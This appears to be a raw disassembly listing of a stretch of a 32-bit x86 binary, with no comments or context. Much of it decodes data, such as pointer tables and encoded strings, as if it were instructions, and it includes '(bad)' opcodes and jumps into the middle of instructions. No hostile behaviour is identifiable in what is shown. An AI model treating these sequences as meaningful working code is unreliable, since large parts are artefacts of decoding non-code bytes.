  43357a:	lods   al,BYTE PTR ds:[esi]
  43357b:	dec    ebp
  43357c:	inc    ebp
  43357d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433583:	retf   
  433584:	mov    edx,ecx
  433586:	adc    al,0x84
  433588:	(bad)  
  433589:	std    
  43358a:	ret    
  43358b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433591:	hlt    
  433592:	rol    edi,0x82
  433595:	ret    
  433596:	cld    
  433597:	enter  0x11ff,0x45
  43359b:	inc    ebp
  43359c:	pop    edi
  43359d:	mov    ebx,DWORD PTR [ebx+0x14]
  4335a0:	ret    0xc7
  4335a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4335a9:	jmp    0x433536
  4335ab:	push   0x8
  4335ad:	call   DWORD PTR [esi]
  4335af:	in     al,dx
  4335b0:	add    BYTE PTR [ebp+0x1],0x50
  4335b4:	add    bh,ah
  4335b6:	add    bh,bh
  4335b8:	icebp  
  4335b9:	mov    ecx,DWORD PTR [eax]
  4335bb:	cld    
  4335bc:	pop    es
  4335bd:	dec    ebp
  4335be:	shl    DWORD PTR [ebx],0x72
  4335c1:	add    eax,DWORD PTR [eax]
  4335c3:	cmp    edx,ecx
  4335c5:	je     0x4335d7
  4335c7:	mov    esi,DWORD PTR [ebp-0x4]
  4335ca:	inc    edi
  4335cc:	or     al,0xc3
  4335ce:	jmp    FWORD PTR [edx-0x18]
  4335d1:	(bad)  
  4335d2:	sti    
  4335d3:	cwde   
  4335d4:	(bad)  
  4335d5:	call   0xffa12ee0
  4335da:	or     al,0x45
  4335dc:	push   ebp
  4335dd:	sub    esp,0x18
  4335e0:	push   ebx
  4335e1:	inc    ebp
  4335e2:	mov    edi,edi
  4335e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335eb:	test   al,0x54
  4335ed:	inc    ebp
  4335ee:	push   ecx
  4335ef:	push   eax
  4335f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4335f6:	add    ah,bh
  4335f8:	(bad)  
  4335f9:	dec    ebp
  4335fa:	add    DWORD PTR [ebx],esi
  4335fc:	inc    ebp
  4335fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433603:	push   0xffffff8b
  433605:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43360b:	add    eax,DWORD PTR [ecx]
  43360d:	or     BYTE PTR [eax],al
  43360f:	call   0xff852e14
  433614:	mov    eax,DWORD PTR [ebp+0x14]
  433617:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43361d:	inc    ebp
  43361e:	dec    ecx
  43361f:	add    ebp,DWORD PTR [edx+0x14]
  433622:	push   0x8b3045
  433627:	call   0x33ad839c
  43362c:	inc    DWORD PTR [ebx]
  43362e:	mov    DWORD PTR [edi],ecx
  433630:	mov    eax,ecx
  433632:	or     BYTE PTR [ebp-0x3d],cl
  433635:	cmp    eax,edi
  433637:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43363c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433642:	adc    al,0xc9
  433644:	inc    ebp
  433645:	adc    BYTE PTR [eax+0x55],dl
  433648:	jne    0x433636
  43364a:	call   0xff5435da
  43364f:	dec    ebp
  433650:	inc    ebp
  433651:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433657:	add    BYTE PTR [ebx],bh
  433659:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43365d:	push   esp
  43365e:	or     al,0x51
  433660:	dec    ebp
  433661:	xor    DWORD PTR [ebx],0xf32039b
  433667:	cmp    eax,DWORD PTR [ebp+0x74]
  43366a:	mov    edi,edi
  43366c:	pop    edi
  43366d:	adc    BYTE PTR [ebx+0x75],bl
  433670:	ret    0x50
  433673:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433677:	(bad)  
  433678:	clc    
  433679:	mov    esp,ebp
  43367b:	pop    ecx
  43367c:	mov    ecx,0xf80085c2
  433681:	mov    ecx,DWORD PTR [ecx+edx*2]
  433684:	push   esi
  433685:	push   esi
  433686:	(bad)  
  433687:	lock add DWORD PTR [ebp+0x44],eax
  43368b:	mov    edx,DWORD PTR [eax]
  43368d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433691:	or     BYTE PTR [edi+eax*1+0x51],dl
  433695:	ret    
  433696:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43369c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336a2:	or     al,0x80
  4336a4:	jge    0x4336a7
  4336a6:	mov    DWORD PTR [eax],eax
  4336a8:	and    al,0x8
  4336aa:	cmp    DWORD PTR [ebp+0x10],eax
  4336ad:	mov    edx,DWORD PTR [esi]
  4336af:	xchg   esp,eax
  4336b0:	dec    esp
  4336b1:	add    BYTE PTR [eax],dl
  4336b3:	mov    ecx,edx
  4336b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336b9:	dec    ebp
  4336ba:	into   
  4336bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336c1:	mov    edx,DWORD PTR [eax+0x14]
  4336c4:	das    
  4336c5:	add    al,0x45
  4336c7:	add    BYTE PTR [ebp+0x0],dh
  4336ca:	mov    edi,edi
  4336cc:	and    al,0x50
  4336ce:	mov    eax,DWORD PTR [eax]
  4336d0:	and    al,0xd1
  4336d2:	xor    eax,DWORD PTR [esi]
  4336d4:	lea    eax,[ebp+0x8]
  4336d7:	xor    esi,DWORD PTR [edx+0x3]
  4336da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4336f0:	cmp    al,0xff
  4336f2:	pushf  
  4336f3:	mov    edi,edi
  4336f5:	or     BYTE PTR [esi+ecx*1],cl
  4336f8:	jne    0x4336bd
  4336fa:	call   0xc36c6
  4336ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433703:	mov    ebx,DWORD PTR [eax]
  433705:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433709:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433711:	pop    esi
  433712:	and    al,0xc9
  433714:	and    al,0x10
  433716:	call   DWORD PTR [ebp-0x73]
  433719:	in     al,dx
  43371a:	jmp    esp
  43371c:	je     0x4336a1
  43371e:	call   DWORD PTR [eax]
  433720:	and    al,0x31
  433722:	call   0xffcd35c3
  433727:	and    al,0x44
  433729:	push   edi
  43372a:	or     al,0x41
  43372c:	pop    esi
  43372d:	mov    ebp,esp
  43372f:	and    al,0xc2
  433731:	mov    eax,DWORD PTR [eax]
  433733:	and    al,0x85
  433735:	mov    edx,0x733080e
  43373a:	jne    0x433736
  43373c:	test   DWORD PTR [ebx+0x3083275],ebx
  433742:	dec    DWORD PTR [ecx-0x74dbdb15]
  433748:	sbb    BYTE PTR [esp+edx*1],cl
  43374b:	jl     0x43374c
  43374d:	adc    al,0x24
  43374f:	dec    ebp
  433750:	mov    esi,DWORD PTR [ebp+0xc]
  433753:	mov    ecx,DWORD PTR [eax]
  433755:	and    al,0x39
  433757:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43375a:	or     BYTE PTR [eax+edx*1],ah
  43375d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433764:	clc    
  433765:	jmp    0x433703
  433767:	adc    al,bh
  433769:	inc    esp
  43376a:	je     0x4337b8
  43376c:	and    al,0xc2
  43376e:	je     0x43370b
  433770:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433776:	dec    DWORD PTR [ecx+0x235fbf08]
  43377c:	sbb    al,0x10
  43377e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433782:	add    BYTE PTR [ebx+0xb],dh
  433785:	adc    BYTE PTR [eax],al
  433787:	mov    WORD PTR ds:0x3d450010,?
  43378d:	adc    BYTE PTR [eax],al
  43378f:	add    DWORD PTR [eax+edx*1],esp
  433792:	add    BYTE PTR [edx+0x6],cl
  433795:	adc    BYTE PTR [eax],al
  433797:	sub    dx,WORD PTR [eax]
  43379a:	add    bh,dl
  43379c:	imul   edx,DWORD PTR [eax],0x10302300
  4337a2:	add    BYTE PTR [esi+0x7b001077],dl
  4337a8:	aaa    
  4337a9:	inc    ebx
  4337aa:	add    BYTE PTR [edi+0x37],bh
  4337ad:	inc    ebx
  4337ae:	add    BYTE PTR [ebx-0x78ffbcc9],al
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [ebx-0x70ffbcc9],cl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x5fffbcc9],ah
  4337d4:	adc    DWORD PTR [eax],edx
  4337d6:	add    BYTE PTR [ecx],cl
  4337d8:	jo     0x4337ea
  4337da:	add    BYTE PTR ds:0xd7001027,ch
  4337e0:	pop    eax
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	push   es
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [esi+0x33001031],ah
  4337ec:	ins    BYTE PTR es:[edi],dx
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jb     0x433830
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	shl    DWORD PTR [edi],cl
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    dh,cl
  433814:	jge    0x433826
  433816:	add    BYTE PTR [esi-0x3dffef8e],dl
  43381c:	or     dl,BYTE PTR [eax]
  43381e:	add    dh,bl
  433820:	sub    dl,BYTE PTR [eax]
  433822:	add    BYTE PTR [edx],bl
  433824:	ins    BYTE PTR es:[edi],dx
  433825:	adc    BYTE PTR [eax],al
  433827:	addr16 jno 0x43383a
  43382a:	add    BYTE PTR [ebp+0x3d],ch
  43382d:	adc    BYTE PTR [eax],al
  43382f:	lds    esp,FWORD PTR [eax+0x10]
  433832:	add    BYTE PTR [ebx],dl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	cmp    al,0x14
  433855:	adc    BYTE PTR [eax],al
  433857:	clc    
  433858:	cmp    dl,BYTE PTR [eax]
  43385a:	add    BYTE PTR [ecx],ah
  43385c:	pop    ds
  43385d:	adc    BYTE PTR [eax],al
  43385f:	mov    edi,0x6001073
  433864:	adc    al,0x10
  433866:	add    BYTE PTR [ecx+0x34],bh
  433869:	adc    BYTE PTR [eax],al
  43386b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43386f:	shl    DWORD PTR [edx+0x10],1
  433872:	add    BYTE PTR [ebx+0x38],dl
  433875:	inc    ebx
  433876:	add    BYTE PTR [edi+0x38],dl
  433879:	inc    ebx
  43387a:	add    BYTE PTR [ebx+0x38],bl
  43387d:	inc    ebx
  43387e:	add    BYTE PTR [edi+0x38],bl
  433881:	inc    ebx
  433882:	add    BYTE PTR [ebx+0x38],ah
  433885:	inc    ebx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebp+0x14],al
  433895:	adc    BYTE PTR [eax],al
  433897:	fwait
  433898:	pop    ds
  433899:	adc    BYTE PTR [eax],al
  43389b:	jnp    0x4338c0
  43389d:	adc    BYTE PTR [eax],al
  43389f:	pop    esi
  4338a0:	adc    BYTE PTR cs:[eax],al
  4338a3:	popf   
  4338a4:	jno    0x4338b6
  4338a6:	add    ah,bl
  4338a8:	inc    ebp
  4338a9:	adc    BYTE PTR [eax],al
  4338ab:	sbb    edx,DWORD PTR [edx+0x10]
  4338ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4338b4:	cmp    BYTE PTR [ebx+0x0],al
  4338b7:	xchg   edi,eax
  4338b8:	cmp    BYTE PTR [ebx+0x0],al
  4338bb:	fwait
  4338bc:	cmp    BYTE PTR [ebx+0x0],al
  4338bf:	lahf   
  4338c0:	cmp    BYTE PTR [ebx+0x0],al
  4338c3:	mov    ds:0xa7004338,eax
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	push   esp
  4338d4:	xor    al,0x4b
  4338d6:	aaa    
  4338d7:	pop    edi
  4338d8:	inc    edx
  4338d9:	dec    ebx
  4338da:	xor    DWORD PTR [ecx],edi
  4338dc:	push   edi
  4338dd:	add    BYTE PTR [ecx+0x39],cl
  4338e0:	xor    al,0x5f
  4338e2:	pop    ecx
  4338e3:	inc    edi
  4338e4:	push   edx
  4338e5:	pop    edi
  4338e6:	dec    edx
  4338e7:	xor    al,BYTE PTR [edx+0x30]
  4338ea:	push   ebx
  4338eb:	add    BYTE PTR [ecx+0x4a],cl
  4338ee:	cmp    BYTE PTR [edi+0x38],bl
  4338f1:	xor    al,0x43
  4338f3:	xor    bl,BYTE PTR [eax+0x36]
  4338f6:	pop    edi
  4338f7:	inc    ebx
  4338f8:	add    BYTE PTR [edx+0x33],cl
  4338fb:	dec    ebp
  4338fc:	cmp    BYTE PTR [edi+0x53],bl
  4338ff:	xor    DWORD PTR [eax],edi
  433901:	pop    edx
  433902:	pop    edi
  433903:	xor    BYTE PTR [edx+0x52],cl
  433906:	inc    ecx
  433907:	add    BYTE PTR [edx+0x42],al
  43390a:	inc    ebp
  43390b:	pop    edi
  43390c:	cmp    DWORD PTR [eax],edi
  43390e:	push   ebp
  43390f:	inc    edx
  433910:	xor    eax,0x5244505f
  433915:	xor    BYTE PTR [eax],al
  433917:	inc    edx
  433918:	inc    esp
  433919:	inc    edx
  43391a:	cmp    DWORD PTR [edi+0x52],ebx
  43391d:	dec    esp
  43391e:	inc    ebp
  43391f:	add    BYTE PTR [ebx+0x37],dl
  433922:	push   esp
  433923:	xor    BYTE PTR [edi+0x55],bl
  433926:	push   ebx
  433927:	aaa    
  433928:	dec    ebp
  433929:	pop    edi
  43392a:	xor    ecx,DWORD PTR [edx+0x4e]
  43392d:	dec    ebx
  43392e:	add    BYTE PTR [edx+0x47],cl
  433931:	inc    edi
  433932:	xor    eax,0x534e5f32
  433937:	push   esp
  433938:	pop    edi
  433939:	push   esp
  43393a:	inc    edx
  43393b:	add    BYTE PTR [ebx+0x4d],al
  43393e:	xor    BYTE PTR [edi+0x47],bl
  433941:	cmp    DWORD PTR [ecx+0x5f],ebx
  433944:	push   eax
  433945:	push   ecx
  433946:	push   ecx
  433947:	pop    edi
  433948:	inc    ebx
  433949:	push   edi
  43394a:	push   esi
  43394b:	add    BYTE PTR [ecx+0x57],cl
  43394e:	inc    ebp
  43394f:	pop    edi
  433950:	pop    ecx
  433951:	push   edx
  433952:	inc    edx
  433953:	pop    edi
  433954:	inc    edi
  433955:	add    BYTE PTR [ebx+0x51],dl
  433958:	cmp    DWORD PTR ds:0x4d305f33,esi
  43395e:	inc    edi
  43395f:	xor    edx,DWORD PTR [edx+0x34]
  433962:	pop    edi
  433963:	pop    edx
  433964:	cmp    BYTE PTR [eax],al
  433966:	inc    edi
  433967:	xor    esi,DWORD PTR ds:0x5451585f
  43396d:	dec    esp
  43396e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433972:	pop    edi
  433973:	cmp    BYTE PTR [edi+0x49],dl
  433976:	xor    eax,0x5700505f
  43397b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43397f:	dec    esi
  433980:	dec    edx
  433981:	cmp    BYTE PTR [eax],al
  433983:	pop    edx
  433984:	dec    ebx
  433985:	xor    eax,0x4f5f3131
  43398a:	xor    dh,BYTE PTR [ecx]
  43398c:	pop    edi
  43398d:	inc    ebp
  43398e:	push   esp
  43398f:	inc    esp
  433990:	inc    ebp
  433991:	add    BYTE PTR [edi+0x55],dl
  433994:	cmp    DWORD PTR [edi+0x5a],ebx
  433997:	push   edx
  433998:	inc    edi
  433999:	xor    DWORD PTR [ebp+0x0],ecx
  43399c:	pop    edx
  43399d:	dec    ecx
  43399e:	dec    ebp
  43399f:	ss pop edi
  4339a1:	pop    edx
  4339a2:	push   edx
  4339a3:	cmp    BYTE PTR [esi+0x30],dl
  4339a6:	pop    edi
  4339a7:	push   ecx
  4339a8:	dec    esi
  4339a9:	add    BYTE PTR [ebx+0x32],dl
  4339ac:	inc    ebx
  4339ad:	cmp    BYTE PTR [edi+0x52],bl
  4339b0:	dec    ecx
  4339b1:	xor    BYTE PTR [eax],al
  4339b3:	inc    edi
  4339b4:	xor    eax,0x314f5f4b
  4339b9:	xor    DWORD PTR [edi+0x38],ebx
  4339bc:	push   ebp
  4339bd:	add    BYTE PTR [edi+0x4b],al
  4339c0:	xor    bl,BYTE PTR [edi+0x43]
  4339c3:	push   ebp
  4339c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4339c7:	ss pop edi
  4339c9:	pop    edx
  4339ca:	push   edi
  4339cb:	inc    esp
  4339cc:	xor    BYTE PTR [eax],al
  4339ce:	dec    ecx
  4339cf:	inc    edi
  4339d0:	xor    eax,0x3058555f
  4339d5:	dec    ebx
  4339d6:	pop    edi
  4339d7:	push   edi
  4339d8:	add    BYTE PTR [eax+0x0],bl
  4339db:	inc    edi
  4339dc:	add    BYTE PTR [edx+0x0],al
  4339df:	pop    edi
  4339e0:	add    BYTE PTR [ebx],dh
  4339e2:	add    BYTE PTR [eax],bh
  4339e4:	add    BYTE PTR [ebx+0x0],cl
  4339e7:	xor    eax,0x33003500
  4339ec:	add    BYTE PTR [eax],dh
  4339ee:	add    BYTE PTR [edi+0x0],bl
  4339f1:	push   esp
  4339f2:	add    BYTE PTR [ebp+0x0],cl
  4339f5:	xor    BYTE PTR [eax],al
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	inc    esi
  4339fa:	add    BYTE PTR [eax+0x0],bl
  4339fd:	xor    BYTE PTR [eax],al
  4339ff:	pop    edi
  433a00:	add    BYTE PTR [ecx],dh
  433a02:	add    BYTE PTR [ebx+0x0],al
  433a05:	xor    eax,0x5f003100
  433a0a:	add    BYTE PTR [ecx+0x0],al
  433a0d:	xor    eax,DWORD PTR [eax]
  433a0f:	add    BYTE PTR [eax],al
  433a11:	push   ebx
  433a12:	add    BYTE PTR [ebx+0x0],dl
  433a15:	dec    eax
  433a16:	add    BYTE PTR [edi+0x0],bl
  433a19:	push   esp
  433a1a:	add    BYTE PTR [ebx+0x0],al
  433a1d:	push   ebx
  433a1e:	add    BYTE PTR [edx+0x0],dl
  433a21:	pop    edi
  433a22:	add    BYTE PTR [ecx+0x0],dl
  433a25:	dec    edi
  433a26:	add    BYTE PTR [edi+0x0],al
  433a29:	push   ecx
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	pop    ecx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],cl
  433a33:	dec    edi
  433a34:	add    BYTE PTR [ebp+0x0],dl
  433a37:	cmp    DWORD PTR [eax],eax
  433a39:	pop    edi
  433a3a:	add    BYTE PTR [edx],dh
  433a3c:	add    BYTE PTR [eax+eax*1+0x32],al
  433a40:	add    BYTE PTR ds:0x47005f00,dh
  433a46:	add    BYTE PTR ds:0x48000000,dh
  433a4c:	add    BYTE PTR [edx+0x0],cl
  433a4f:	push   eax
  433a50:	add    BYTE PTR [edi+0x0],bl
  433a53:	cmp    BYTE PTR [eax],al
  433a55:	add    BYTE PTR ss:0x55004100,dh
  433a5c:	add    BYTE PTR [edi+0x0],bl
  433a5f:	push   edx
  433a60:	add    BYTE PTR [edi],dh
  433a62:	add    BYTE PTR [ecx+0x0],cl
  433a65:	add    BYTE PTR [eax],al
  433a67:	inc    esp
  433a68:	add    BYTE PTR [ecx+0x0],dl
  433a6b:	inc    edx
  433a6c:	add    BYTE PTR [edi+0x0],bl
  433a6f:	push   ecx
  433a70:	add    BYTE PTR [ecx+0x0],bl
  433a73:	dec    edi
  433a74:	add    BYTE PTR [eax+0x0],dl
  433a77:	add    BYTE PTR [eax],al
  433a79:	dec    edx
  433a7a:	add    BYTE PTR [ecx+0x0],dl
  433a7d:	inc    esp
  433a7e:	add    BYTE PTR [edi+0x0],bl
  433a81:	dec    edx
  433a82:	add    BYTE PTR [eax],dh
  433a84:	add    BYTE PTR [ecx],dh
  433a86:	add    BYTE PTR [ebx+0x0],dl
  433a89:	push   ecx
  433a8a:	add    BYTE PTR [ecx],dh
  433a8c:	add    BYTE PTR [edi+0x0],bl
  433a8f:	push   edi
  433a90:	add    BYTE PTR [eax],al
  433a92:	add    BYTE PTR [ebx+0x0],cl
  433a95:	pop    edx
  433a96:	add    BYTE PTR [esi],dh
  433a98:	add    BYTE PTR [edi+0x0],bl
  433a9b:	inc    ebx
  433a9c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433aa0:	add    BYTE PTR [edi+0x0],bl
  433aa3:	push   edi
  433aa4:	add    BYTE PTR [ebx],dh
  433aa6:	add    BYTE PTR [esi+0x0],cl
  433aa9:	push   ebp
  433aaa:	add    BYTE PTR [edi+0x0],bl
  433aad:	dec    edx
  433aae:	add    BYTE PTR [eax],al
  433ab0:	add    BYTE PTR [edi+0x0],dl
  433ab3:	aaa    
  433ab4:	add    BYTE PTR [eax],bh
  433ab6:	add    BYTE PTR [edi+0x0],bl
  433ab9:	pop    eax
  433aba:	add    BYTE PTR [edi+0x0],cl
  433abd:	inc    edi
  433abe:	add    BYTE PTR [edi+0x0],bl
  433ac1:	xor    al,0x0
  433ac3:	push   eax
  433ac4:	add    BYTE PTR [ecx+0x0],cl
  433ac7:	push   ebp
  433ac8:	add    BYTE PTR [eax],al
  433aca:	add    BYTE PTR [edi+0x0],dl
  433acd:	push   esp
  433ace:	add    BYTE PTR [ebx+0x0],cl
  433ad1:	add    BYTE PTR [eax],al
  433ad3:	add    BYTE PTR [edx+0x53],dl
  433ad6:	inc    esp
  433ad7:	push   ebx
  433ad8:	push   esi
  433ad9:	inc    esi
  433ada:	sar    ecx,1
  433adc:	jns    0x433af8
  433ade:	pop    ebx
  433adf:	dec    eax
  433ae0:	xchg   ch,al
  433ae2:	rol    BYTE PTR [ecx+0x1e90c137],1
  433ae8:	sbb    eax,DWORD PTR [eax]
  433aea:	add    BYTE PTR [eax],al
  433aec:	push   esp
  433aed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433af1:	addr16 push edi
  433af3:	bound  bx,DWORD PTR [edx+0x45]
  433af7:	outs   dx,BYTE PTR ds:[esi]
  433af8:	pop    esp
  433af9:	je     0x433b6e
  433afb:	ja     0x433b3e
  433afd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433b05:	js     0x433b76
  433b07:	jp     0x433b78
  433b09:	jns    0x433b6f
  433b0b:	jp     0x433b75
  433b0d:	je     0x433b73
  433b0f:	jp     0x433b73
  433b11:	cs jo  0x433b78
  433b14:	bound  eax,QWORD PTR [eax]
	...
